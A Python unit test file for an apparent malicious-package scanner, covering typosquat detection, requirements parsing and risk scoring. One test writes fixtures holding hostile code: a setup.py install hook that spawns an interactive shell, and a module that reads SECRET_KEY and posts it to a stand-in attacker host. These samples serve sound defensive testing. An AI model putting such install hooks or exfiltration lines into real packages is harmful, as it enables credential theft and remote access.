"""Unit tests for ML / static analysis modules."""

from __future__ import annotations

from app.services.static_analysis.feature_extractor import FEATURE_ORDER, extract_features
from app.services.static_analysis.typosquat_detector import is_typosquat
from app.services.scan_service import parse_requirements_txt


def test_feature_order_length():
    assert len(FEATURE_ORDER) == 8


def test_extract_features_on_backend_tree():
    trusted = {"fastapi", "requests", "numpy"}
    features = extract_features(".", trusted)
    assert set(features.keys()) == set(FEATURE_ORDER)


def test_typosquat_detects_near_miss():
    trusted = ["requests", "flask"]
    flagged, score, match = is_typosquat("reqeusts", trusted, threshold=65.0)
    assert flagged is True
    assert match == "requests"
    assert score >= 65.0


def test_typosquat_exact_match_not_flagged():
    trusted = ["requests"]
    flagged, _score, match = is_typosquat("requests", trusted)
    assert flagged is False
    assert match == "requests"


def test_parse_requirements_txt():
    content = "requests>=2.28\nflask\n# comment\n"
    pkgs = parse_requirements_txt(content)
    assert pkgs == ["requests", "flask"]


def test_structured_findings_format_and_taxonomy(tmp_path):
    pkg_dir = tmp_path / "test_pkg"
    pkg_dir.mkdir()

    # Create setup.py with execution hook
    setup_file = pkg_dir / "setup.py"
    setup_file.write_text(
        "import subprocess\n"
        "subprocess.Popen(['/bin/sh', '-i'])\n",
        encoding="utf-8",
    )

    # Create module with exfiltration and credential discovery
    mod_file = pkg_dir / "worker.py"
    mod_file.write_text(
        "import requests\n"
        "import socket\n"
        "import os\n"
        "token = os.getenv('SECRET_KEY')\n"
        "requests.post('https://attacker.site/leak', data={'token': token})\n",
        encoding="utf-8",
    )

    trusted = {"requests"}
    features = extract_features(str(pkg_dir), trusted)

    assert hasattr(features, "findings")
    findings = features.findings
    assert len(findings) > 0

    required_keys = {"indicator_id", "category", "line_number", "code_snippet", "file_path"}
    valid_categories = {
        "Execution",
        "Persistence",
        "Defense Evasion",
        "Exfiltration",
        "Discovery",
        "Command & Control",
        "Metadata Manipulation",
    }

    for f in findings:
        assert required_keys.issubset(set(f.keys()))
        assert f["category"] in valid_categories
        assert isinstance(f["line_number"], int)
        assert isinstance(f["code_snippet"], str)
        assert isinstance(f["file_path"], str)

    # Check setup.py finding
    setup_findings = [f for f in findings if f["file_path"] == "setup.py"]
    assert len(setup_findings) > 0
    assert any(f["indicator_id"] in ("EXEC_SUBPROCESS", "PERSIST_INSTALL_HOOK") for f in setup_findings)


def test_install_script_weighting():
    from app.services.static_analysis.predict import RiskModel, INSTALL_SCRIPT_WEIGHT

    assert INSTALL_SCRIPT_WEIGHT == 1.5

    model = RiskModel()
    sample_features = {
        "has_network_call": 1.0,
        "has_file_system_access": 0.0,
        "has_command_execution": 1.0,
        "has_credential_access": 0.0,
        "has_code_obfuscation": 0.0,
        "has_dynamic_imports": 0.0,
        "external_url_count": 0.0,
        "suspicious_dependency_count": 0.0,
        "maintainer_count": 2.0,
        "maintainer_account_age": 100.0,
        "days_since_first_publish": 200.0,
        "days_since_last_release": 20.0,
        "release_frequency": 2.0,
        "has_irregular_release_burst": 0.0,
        "declared_dependency_count": 5.0,
        "file_count": 3.0,
    }

    # Prediction without install script findings
    non_install_findings = [
        {
            "indicator_id": "EXEC_SUBPROCESS",
            "category": "Execution",
            "line_number": 10,
            "code_snippet": "subprocess.run(['ls'])",
            "file_path": "utils.py",
        }
    ]
    res_base = model.predict(sample_features, findings=non_install_findings)

    # Prediction with install script findings (in setup.py)
    install_findings = [
        {
            "indicator_id": "EXEC_SUBPROCESS",
            "category": "Persistence",
            "line_number": 47,
            "code_snippet": "subprocess.Popen(['/bin/sh'])",
            "file_path": "setup.py",
            "title": "Reverse Shell pattern",
        }
    ]
    res_weighted = model.predict(sample_features, findings=install_findings)

    # Risk score should be scaled by INSTALL_SCRIPT_WEIGHT (or capped at 100)
    expected_score = min(100.0, round(res_base.risk_score * INSTALL_SCRIPT_WEIGHT, 1))
    assert res_weighted.risk_score == expected_score
    assert len(res_weighted.findings) > 0
    # Explanation should contain the formatted line-specific explanation
    assert any("Line 47 in setup.py — Reverse Shell pattern" in exp for exp in res_weighted.explanation)

